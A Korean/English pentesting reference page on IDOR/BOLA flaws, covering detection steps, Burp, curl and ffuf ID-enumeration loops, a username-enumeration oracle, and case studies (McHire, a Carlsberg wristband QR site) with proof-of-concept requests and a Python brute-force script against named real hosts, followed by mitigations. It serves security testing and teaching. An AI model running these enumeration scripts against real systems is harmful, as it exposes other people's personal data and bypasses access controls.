# IDOR (Insecure Direct Object Reference)

{{#include ../banners/hacktricks-training.md}}

IDOR (Insecure Direct Object Reference) / Broken Object Level Authorization (BOLA)는 웹 또는 API 엔드포인트가 사용자 제어가 가능한 식별자를 공개하거나 수락하고, 그 식별자가 내부 객체에 접근하기 위해 **직접** 사용되며 호출자가 해당 객체에 접근/수정할 권한이 있는지를 **검증하지 않는 경우**에 발생합니다.
성공적인 악용은 일반적으로 다른 사용자의 데이터를 읽거나 수정하는 등의 수평적 또는 수직적 권한 상승을 허용하며, 최악의 경우 계정 탈취나 대량 데이터 유출로 이어질 수 있습니다.

---
## 1. 잠재적 IDOR 식별

1. **객체를 참조하는 파라미터**를 찾으세요:
* 경로: `/api/user/1234`, `/files/550e8400-e29b-41d4-a716-446655440000`
* 쿼리: `?id=42`, `?invoice=2024-00001`
* Body / JSON: `{"user_id": 321, "order_id": 987}`
* 헤더 / 쿠키: `X-Client-ID: 4711`
2. 데이터를 **읽거나 업데이트**하는 엔드포인트를 우선적으로 살펴보세요 (`GET`, `PUT`, `PATCH`, `DELETE`).
3. 식별자가 **연속적이거나 예측 가능**한지 주목하세요 – 예를 들어 ID가 `64185742`라면 `64185741`도 존재할 가능성이 큽니다.
4. 숨겨진 또는 대체 흐름(예: 로그인 페이지의 *"Paradox team members"* 링크) 등을 탐색하여 추가 API가 노출되는지 확인하세요.
5. **권한이 낮은 인증된 세션**을 사용하고 ID만 변경하면서 **같은 토큰/쿠키를 유지**하세요. 권한 오류가 없으면 보통 IDOR의 징후입니다.

### 빠른 수동 변조 (Burp Repeater)
```
PUT /api/lead/cem-xhr HTTP/1.1
Host: www.example.com
Cookie: auth=eyJhbGciOiJIUzI1NiJ9...
Content-Type: application/json

{"lead_id":64185741}
```
### 자동화된 열거 (Burp Intruder / curl loop)
```bash
for id in $(seq 64185742 64185700); do
curl -s -X PUT 'https://www.example.com/api/lead/cem-xhr' \
-H 'Content-Type: application/json' \
-H "Cookie: auth=$TOKEN" \
-d '{"lead_id":'"$id"'}' | jq -e '.email' && echo "Hit $id";
done
```
### 예측 가능한 download ID 열거 (ffuf)
인증된 파일 호스팅 패널은 종종 사용자별 메타데이터를 단일 `files` 테이블에 저장하고 `/download.php?id=<int>` 같은 다운로드 엔드포인트를 노출합니다.  
핸들러가 ID의 존재 여부만 확인하고(해당 ID가 인증된 사용자에게 속하는지 여부는 확인하지 않는 경우), 유효한 session cookie로 정수 공간을 스윕하여 다른 테넌트의 backups/configs를 훔칠 수 있습니다:
```bash
ffuf -u http://file.era.htb/download.php?id=FUZZ \
-H "Cookie: PHPSESSID=<session>" \
-w <(seq 0 6000) \
-fr 'File Not Found' \
-o hits.json
jq -r '.results[].url' hits.json    # fetch surviving IDs such as company backups or signing keys
```
* `-fr`은 404-style 템플릿을 제거하여 실제 히트만 남깁니다 (e.g., IDs 54/150 leaking full site backups and signing material).
* 동일한 FFUF 워크플로우는 Burp Intruder나 curl 루프에서도 작동합니다—단, ID를 증가시키는 동안 인증 상태를 유지해야 합니다.

---

### Error-response oracle for user/file enumeration

When a download endpoint accepts both a username and a filename (e.g. `/view.php?username=<u>&file=<f>`), subtle differences in error messages often create an oracle:

- 존재하지 않는 username → "User not found"
- 잘못된 filename이지만 유효한 extension → "File does not exist" (때로는 사용 가능한 파일을 나열하기도 함)
- 잘못된 extension → validation error

With any authenticated session, you can fuzz the username parameter while holding a benign filename and filter on the "user not found" string to discover valid users:
```bash
ffuf -u 'http://target/view.php?username=FUZZ&file=test.doc' \
-b 'PHPSESSID=<session-cookie>' \
-w /opt/SecLists/Usernames/Names/names.txt \
-fr 'User not found'
```
유효한 사용자 이름을 확인한 후에는 특정 파일을 직접 요청하세요(예: `/view.php?username=amanda&file=privacy.odt`). 이러한 패턴은 다른 사용자의 문서가 무단으로 공개되거나 자격 증명 누출로 이어지는 경우가 많습니다.

---
## 2. 실제 사례 연구 – McHire Chatbot Platform (2025)

Paradox.ai 기반의 **McHire** 채용 포털을 평가하는 동안 다음과 같은 IDOR가 발견되었습니다:

* Endpoint: `PUT /api/lead/cem-xhr`
* Authorization: user session cookie for **any** restaurant test account
* Body parameter: `{"lead_id": N}` – 8자리, **순차적인** 숫자 식별자

`lead_id`를 감소시키면 테스터는 임의 지원자의 **full PII**(name, e-mail, phone, address, shift preferences)와 session hijacking을 허용하는 consumer **JWT**를 획득했습니다. `1 – 64,185,742` 범위를 열거한 결과 대략 **64 million** 건의 레코드가 노출되었습니다.

Proof-of-Concept request:
```bash
curl -X PUT 'https://www.mchire.com/api/lead/cem-xhr' \
-H 'Content-Type: application/json' \
-d '{"lead_id":64185741}'
```
Combined with **default admin credentials** (`123456:123456`) that granted access to the test account, the vulnerability resulted in a critical, company-wide data breach.

### 사례 연구 – 손목밴드 QR 코드: weak bearer tokens (2025–2026)

*흐름:* Exhibition visitors received QR-coded wristbands; scanning `https://homeofcarlsberg.com/memories/` let the browser take the **프린트된 손목밴드 ID**, hex-encode it, and call a `cloudfunctions.net` backend to fetch stored media (photos/videos + names). There was **no session binding** or user authentication—**ID를 아는 것 = 권한 부여**.

*예측 가능성:* Wristband IDs followed a short pattern such as `C-285-100` → ASCII hex `432d3238352d313030` (`43 2d 32 38 35 2d 31 30 30`). The space was estimated at ~26M combinations, trivial to exhaust online.

*Burp Intruder를 사용한 Exploitation 워크플로우:*
1. **Payload generation:** 후보 ID를 생성(예: `[A-Z]-###-###`). Use a Burp Intruder **Pitchfork** or **Cluster Bomb** attack with positions for the letter and digits. Add a **payload processing rule → Add prefix/suffix → payload encoding: ASCII hex** so each request transmits the hex string expected by the backend.
2. **Response grep:** Intruder의 **grep-match**를 유효한 응답에만 존재하는 마커(예: media URLs/JSON fields)에 대해 설정하세요. Invalid IDs typically returned an empty array/404.
3. **Throughput measurement:** 랩탑에서 약 2시간 동안 ~1,000,000개의 ID를 테스트했으며(약 139 req/s), 이 속도로는 전체 키스페이스(~26M)를 약 52시간 만에 모두 탐색할 수 있습니다. 샘플 실행만으로도 이미 약 500개의 유효한 손목밴드(동영상 + 전체 이름)가 노출되었습니다.
4. **Rate-limiting verification:** 공급업체가 쓰로틀링을 주장한 후 동일한 Intruder 설정을 다시 실행했습니다. 동일한 처리량/히트율이 확인되어 해당 제어가 없었거나 효과가 없음을 증명했고, enumeration은 제약 없이 계속되었습니다.

간단한 스크립트형 변형(클라이언트 측 16진수 인코딩):
```python
import requests

def to_hex(s):
return ''.join(f"{ord(c):02x}" for c in s)

for band_id in ["C-285-100", "T-544-492"]:
hex_id = to_hex(band_id)
r = requests.get("https://homeofcarlsberg.com/memories/api", params={"id": hex_id})
if r.ok and "media" in r.text:
print(band_id, "->", r.json())
```
> **교훈:** 인코딩 (ASCII→hex/Base64)은 엔트로피를 추가하지 않는다; 짧은 ID는 겉보기 인코딩에도 불구하고 나열 가능한 **bearer tokens**가 된다. 사용자별 인가 + 고엔트로피 비밀값이 없으면, media/PII는 “rate limiting”을 주장하더라도 대량 수집될 수 있다.

---
## 3. IDOR / BOLA의 영향
* 수평 권한 상승 – **다른 사용자**의 데이터 읽기/수정/삭제.
* 수직 권한 상승 – 낮은 권한 사용자가 관리자 전용 기능 획득.
* 식별자가 연속적이면(예: 지원자 ID, 인보이스) 대량 데이터 유출.
* 다른 사용자의 토큰을 훔치거나 비밀번호를 재설정하여 계정 탈취.

---
## 4. 완화 방안 및 모범 사례
1. 모든 요청에 대해 **object-level authorization** 적용 (`user_id == session.user`).
2. 자동 증가 ID 대신 **간접적이고 추측 불가능한 식별자**(UUIDv4, ULID) 사용.
3. 인가 검사를 반드시 **server-side**에서 수행하고 숨겨진 폼 필드나 UI 제어에 의존하지 말 것.
4. 중앙 미들웨어에서 **RBAC / ABAC** 검사 구현.
5. ID 열거를 탐지하기 위해 **rate-limiting & logging** 추가.
6. 새로운 엔드포인트는 모두 보안 테스트 수행 (unit, integration, 및 DAST).

---
## 5. 도구
* **BurpSuite extensions**: Authorize, Auto Repeater, Turbo Intruder.
* **OWASP ZAP**: Auth Matrix, Forced Browse.
* **Github projects**: `bwapp-idor-scanner`, `Blindy` (bulk IDOR hunting).



## References
* [McHire Chatbot Platform: Default Credentials and IDOR Expose 64M Applicants’ PII](https://ian.sh/mcdonalds)
* [OWASP Top 10 – Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
* [How to Find More IDORs – Vickie Li](https://medium.com/@vickieli/how-to-find-more-idors-ae2db67c9489)
* [HTB Nocturnal: IDOR oracle → file theft](https://0xdf.gitlab.io/2025/08/16/htb-nocturnal.html)
* [0xdf – HTB Era: predictable download IDs → backups and signing keys](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
* [Carlsberg memories wristband IDOR – predictable QR IDs + Intruder brute force (2026)](https://www.pentestpartners.com/security-blog/carlsberg-probably-not-the-best-cybersecurity-in-the-world/)
{{#include ../banners/hacktricks-training.md}}
